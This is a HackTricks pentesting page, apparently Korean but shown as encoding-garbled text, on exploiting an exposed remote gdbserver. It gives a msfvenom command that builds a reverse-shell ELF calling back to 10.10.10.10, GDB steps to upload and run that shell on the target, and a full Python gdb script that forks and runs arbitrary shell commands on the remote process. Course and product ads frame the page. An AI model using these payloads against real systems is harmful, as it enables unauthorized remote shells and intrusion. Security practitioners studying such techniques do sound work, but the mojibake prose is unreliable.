# ì›ê²© GdbServer íœí…ŒìŠ¤íŒ…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PDFë¡œ HackTricks ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks êµ¿ì¦ˆ**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**ì·¨ì•½ì  í‰ê°€ ë° íœíŠ¸ìŠ¤íŒ…ì„ ìœ„í•œ ì¦‰ì‹œ ì‚¬ìš© ê°€ëŠ¥í•œ ì„¤ì •**. 20ê°œ ì´ìƒì˜ ë„êµ¬ ë° ê¸°ëŠ¥ìœ¼ë¡œ ì–´ë””ì„œë“  ì „ì²´ íœí…ŒìŠ¤íŠ¸ë¥¼ ì‹¤í–‰í•˜ì‹­ì‹œì˜¤. ì´ëŠ” reconë¶€í„° ë³´ê³ ì„œ ì‘ì„±ê¹Œì§€ ì´ì–´ì§€ëŠ” ì‚¬ìš©ì ì •ì˜ ë„êµ¬, íƒì§€ ë° ìµìŠ¤í”Œë¡œì‡ ëª¨ë“ˆì„ ê°œë°œí•˜ì—¬ íœí…ŒìŠ¤í„°ë¥¼ ëŒ€ì²´í•˜ì§€ ì•Šê³  ê¹Šì´ íŒŒê³ ë“¤ê³  ì‰˜ì„ ì—´ê³  ì¦ê¸¸ ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.

{% embed url="https://pentest-tools.com/" %}

## **ê¸°ë³¸ ì •ë³´**

**gdbserver**ëŠ” í”„ë¡œê·¸ë¨ì„ ì›ê²©ìœ¼ë¡œ ë””ë²„ê¹…í•  ìˆ˜ ìˆê²Œ í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ì´ëŠ” "íƒ€ê²Ÿ"ì´ë¼ê³  í•˜ëŠ” ë™ì¼í•œ ì‹œìŠ¤í…œì—ì„œ ë””ë²„ê¹…ì´ í•„ìš”í•œ í”„ë¡œê·¸ë¨ê³¼ í•¨ê»˜ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ ì„¤ì •ì„ í†µí•´ **GNU ë””ë²„ê±°**ê°€ ì†ŒìŠ¤ ì½”ë“œì™€ ë””ë²„ê¹…ëœ í”„ë¡œê·¸ë¨ì˜ ë°”ì´ë„ˆë¦¬ ì‚¬ë³¸ì´ ì €ì¥ëœ "í˜¸ìŠ¤íŠ¸"ë¼ëŠ” ë‹¤ë¥¸ ê¸°ê³„ì—ì„œ ì—°ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **gdbserver**ì™€ ë””ë²„ê±° ê°„ì˜ ì—°ê²°ì€ TCP ë˜ëŠ” ì§ë ¬ ë¼ì¸ì„ í†µí•´ ì´ë£¨ì–´ì§€ë©° ë‹¤ì–‘í•œ ë””ë²„ê¹… ì„¤ì •ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

**gdbserverë¥¼ ì–´ë–¤ í¬íŠ¸ì—ì„œë“  ë“£ë„ë¡ ì„¤ì •**í•  ìˆ˜ ìˆìœ¼ë©° **í˜„ì¬ nmapì€ ì„œë¹„ìŠ¤ë¥¼ ì¸ì‹í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.

## ìµìŠ¤í”Œë¡œì‡

### ì—…ë¡œë“œ ë° ì‹¤í–‰

**msfvenomì„ ì‚¬ìš©í•˜ì—¬ elf ë°±ë„ì–´ë¥¼ ì‰½ê²Œ ìƒì„±**í•˜ê³  ì—…ë¡œë“œí•˜ì—¬ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.10.11:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```
### ì„ì˜ ëª…ë ¹ ì‹¤í–‰

**ë””ë²„ê±°ê°€ ì„ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë„ë¡ í•˜ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.** [**ì—¬ê¸°ì—ì„œ ê°€ì ¸ì˜¨ íŒŒì´ì¬ ì‚¬ìš©ì ì •ì˜ ìŠ¤í¬ë¦½íŠ¸**](https://stackoverflow.com/questions/26757055/gdbserver-execute-shell-commands-of-the-target) **ë¥¼ í†µí•´ ê°€ëŠ¥í•©ë‹ˆë‹¤.**
```bash
# Given remote terminal running `gdbserver :2345 ./remote_executable`, we connect to that server.
target extended-remote 192.168.1.4:2345

# Load our custom gdb command `rcmd`.
source ./remote-cmd.py

# Change to a trusty binary and run it to load it
set remote exec-file /bin/bash
r

# Run until a point where libc has been loaded on the remote process, e.g. start of main().
tb main
r

# Run the remote command, e.g. `ls`.
rcmd ls
```
ë¨¼ì € **ë¡œì»¬ë¡œ ì´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ìƒì„±í•˜ì„¸ìš”**:

{% code title="remote-cmd.py" %}
```python
#!/usr/bin/env python3

import gdb
import re
import traceback
import uuid


class RemoteCmd(gdb.Command):
def __init__(self):
self.addresses = {}

self.tmp_file = f'/tmp/{uuid.uuid4().hex}'
gdb.write(f"Using tmp output file: {self.tmp_file}.\n")

gdb.execute("set detach-on-fork off")
gdb.execute("set follow-fork-mode parent")

gdb.execute("set max-value-size unlimited")
gdb.execute("set pagination off")
gdb.execute("set print elements 0")
gdb.execute("set print repeats 0")

super(RemoteCmd, self).__init__("rcmd", gdb.COMMAND_USER)

def preload(self):
for symbol in [
"close",
"execl",
"fork",
"free",
"lseek",
"malloc",
"open",
"read",
]:
self.load(symbol)

def load(self, symbol):
if symbol not in self.addresses:
address_string = gdb.execute(f"info address {symbol}", to_string=True)
match = re.match(
f'Symbol "{symbol}" is at ([0-9a-fx]+) .*', address_string, re.IGNORECASE
)
if match and len(match.groups()) > 0:
self.addresses[symbol] = match.groups()[0]
else:
raise RuntimeError(f'Could not retrieve address for symbol "{symbol}".')

return self.addresses[symbol]

def output(self):
# From `fcntl-linux.h`
O_RDONLY = 0
gdb.execute(
f'set $fd = (int){self.load("open")}("{self.tmp_file}", {O_RDONLY})'
)

# From `stdio.h`
SEEK_SET = 0
SEEK_END = 2
gdb.execute(f'set $len = (int){self.load("lseek")}($fd, 0, {SEEK_END})')
gdb.execute(f'call (int){self.load("lseek")}($fd, 0, {SEEK_SET})')
if int(gdb.convenience_variable("len")) <= 0:
gdb.write("No output was captured.")
return

gdb.execute(f'set $mem = (void*){self.load("malloc")}($len)')
gdb.execute(f'call (int){self.load("read")}($fd, $mem, $len)')
gdb.execute('printf "%s\\n", (char*) $mem')

gdb.execute(f'call (int){self.load("close")}($fd)')
gdb.execute(f'call (int){self.load("free")}($mem)')

def invoke(self, arg, from_tty):
try:
self.preload()

is_auto_solib_add = gdb.parameter("auto-solib-add")
gdb.execute("set auto-solib-add off")

parent_inferior = gdb.selected_inferior()
gdb.execute(f'set $child_pid = (int){self.load("fork")}()')
child_pid = gdb.convenience_variable("child_pid")
child_inferior = list(
filter(lambda x: x.pid == child_pid, gdb.inferiors())
)[0]
gdb.execute(f"inferior {child_inferior.num}")

try:
gdb.execute(
f'call (int){self.load("execl")}("/bin/sh", "sh", "-c", "exec {arg} >{self.tmp_file} 2>&1", (char*)0)'
)
except gdb.error as e:
if (
"The program being debugged exited while in a function called from GDB"
in str(e)
):
pass
else:
raise e
finally:
gdb.execute(f"inferior {parent_inferior.num}")
gdb.execute(f"remove-inferiors {child_inferior.num}")

self.output()
except Exception as e:
gdb.write("".join(traceback.TracebackException.from_exception(e).format()))
raise e
finally:
gdb.execute(f'set auto-solib-add {"on" if is_auto_solib_add else "off"}')


RemoteCmd()
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**ì·¨ì•½ì  í‰ê°€ ë° ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•œ ì¦‰ì‹œ ì‚¬ìš© ê°€ëŠ¥í•œ ì„¤ì •**. 20ê°€ì§€ ì´ìƒì˜ ë„êµ¬ ë° ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ ì–´ë””ì„œë“  ì „ì²´ íœí…ŒìŠ¤íŠ¸ë¥¼ ì‹¤í–‰í•˜ê³ , ì •ì°°ë¶€í„° ë³´ê³ ì„œ ì‘ì„±ê¹Œì§€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ìš°ë¦¬ëŠ” íœí…ŒìŠ¤í„°ë¥¼ ëŒ€ì²´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤ - ëŒ€ì‹ , ì‚¬ìš©ìë“¤ì´ ë” ì‹¬ì¸µì ìœ¼ë¡œ íŒŒê³ ë“¤ê³ , ì‰˜ì„ ì—´ê³  ì¦ê¸¸ ìˆ˜ ìˆë„ë¡ ë§ì¶¤í˜• ë„êµ¬, íƒì§€ ë° ê³µê²© ëª¨ë“ˆì„ ê°œë°œí•©ë‹ˆë‹¤.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ì˜ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks êµ¿ì¦ˆ**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ì €í¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”**.

</details>
